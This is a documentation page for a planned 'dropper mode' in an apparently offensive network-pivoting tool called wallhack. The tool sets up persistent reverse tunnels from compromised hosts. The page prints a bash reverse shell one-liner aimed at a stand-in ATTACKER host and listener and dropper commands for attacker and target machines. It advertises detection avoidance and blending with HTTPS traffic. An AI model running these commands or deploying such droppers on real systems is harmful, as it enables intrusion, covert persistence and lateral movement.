# Dropper Mode

{% badge text="Coming Soon" variant="secondary" /%} {% badge text="Experimental" variant="outline" /%}

Future feature making reverse tunnels as simple as reverse shells. Drop, execute, and get instant network access.

{% card title="Reverse Tunnel Simplicity" icon="lightning" description="Traditional reverse shells give you a command prompt. Dropper mode gives you an entire network. No manual connection setup, no complex flag combinations — just drop and pivot." /%}

{% grid cols=2 %}
{% card title="Traditional Reverse Shell" icon="terminal" description="Gives you a command prompt on the target" %}
```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
```

Limited to executing commands on the compromised host
{% /card %}

{% card title="Dropper Mode" icon="parachute" description="Gives you Layer 3 access to the entire network" %}
```bash
./wallhack-drop ATTACKER:443
```

Full network-level access for scanning, pivoting, exploitation
{% /card %}
{% /grid %}

## Key Features

{% grid cols=2 %}
{% feature title="Single Command Deployment" icon="skull" %}
Drop the binary, execute once, establish persistent tunnel
{% /feature %}

{% feature title="Automatic Reconnection" icon="skull" %}
Built-in retry logic maintains connectivity through network instability
{% /feature %}

{% feature title="Minimal Footprint" icon="skull" %}
Small binary size and low resource usage avoid detection
{% /feature %}

{% feature title="Stealth Operation" icon="skull" %}
Blends with normal HTTPS traffic on common ports
{% /feature %}
{% /grid %}

## Planned Usage

{% steps %}
{% step title="Start Listener" number=1 %}
Configure your machine to accept dropper connections

{% codeblock code="wallhack --dropper-listen :443" title="Attacker machine" /%}
{% /step %}

{% step title="Deploy Binary" number=2 %}
Transfer and execute the dropper on the target

{% codeblock code="./wallhack-drop ATTACKER_IP:443" title="Target host" /%}
{% /step %}

{% step title="Automatic Setup" number=3 %}
Tunnel establishes automatically, routes are configured, network is accessible

**Result:** Full Layer 3 access to the target's network through a persistent reverse tunnel.
{% /step %}
{% /steps %}

{% callout type="warning" title="Status" %}
Dropper mode is under active development. The goal is to make network pivoting as ubiquitous and simple as reverse shells are today. Follow the [GitHub repository](https://github.com/block65/wallhack) for updates.
{% /callout %}
